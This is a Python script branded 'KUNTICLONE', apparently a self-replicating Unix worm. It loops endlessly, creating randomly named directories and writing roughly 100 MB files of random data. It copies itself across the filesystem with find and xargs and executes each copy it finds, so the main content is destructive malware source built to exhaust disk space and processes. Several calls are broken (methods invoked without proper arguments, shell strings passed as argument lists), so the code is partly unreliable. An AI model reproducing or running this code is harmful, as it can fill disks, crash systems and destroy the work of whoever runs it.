from sys import argv
import subprocess
import string
import sys
import random
import os
from termcolor import colored as cl

class zetsu:
    def __init__(self, nn, ii, ff, pj, yh, tt):
        self.nn = nn
        self.ii = ii
        self.ff = ff
        self.pj = pj
        self.yh = yh
        self.tt = tt

    def logo():
        print(cl("""
  (( ))
  66666 __________  6
  6 6 6 KUNTICLONE\\/
  66666  ||    ||
   666   **    **
  By CukiD for UNIX\n""", "red"))

    def genuk(aa, bb):
        kb = 100_000
        with open(bb, 'wb') as file:
            file.write(os.urandom(aa*kb))

    def lanjut(self):
        yy = [f'ls -h | grep / | xargs -I % cp {self.tt[-1]} %/{self.tt[-1]}', f'find / | grep {self.yh} | uniq | xargs -I @ python3 @']
        bb = 'find -type d | sed \'s/\// /g\' | awk \'{ print \$1"/"$2"/"$3"/"$4 }\' | xargs -I @ cp',self.tt[-1],'@'
        subprocess.call(['mkdir', self.tt[-1]])
        self.genuk(1024, self.ff)
        subprocess.call(['cp',self.ff,self.tt[-1]])
        for _ in range(2):
            subprocess.call([f'cp {self.yh} $pwd/{self.tt[-1]}'])
        subprocess.call([yy[0]])
        subprocess.call([yy[1]])
        subprocess.call([bb])
        subprocess.call([yy[1]])

    def main(self):
        while(self.ii > 0):
            rn = ''.join(random.choice(string.ascii_letters) for _ in range(self.pj))
            try:
                if self.ii == self.ii:
                    self.ii += 1
                    dir = rn+str(self.ii)
                    self.tt.append(dir)
                    self.lanjut()
                elif self.ii <= self.ii:
                    self.ii += 2
                    dir = rn+str(self.ii)
                    self.tt.append(dir)
                    self.lanjut()
            except KeyboardInterrupt:
                zetsu.main(self.nn, self.ii, self.ff, self.pj, self.yh)

if __name__ == "__main__":
    perintah = argv
    nama = str(perintah[0])
    i = 1
    filename = "karma"
    panjang = 16
    yuhu = sys.argv[0]
    namaprogram = yuhu[2:]
    tmp = []
    zetsu.logo()
    zetsu.main(nama, i, filename, panjang, namaprogram, tmp)
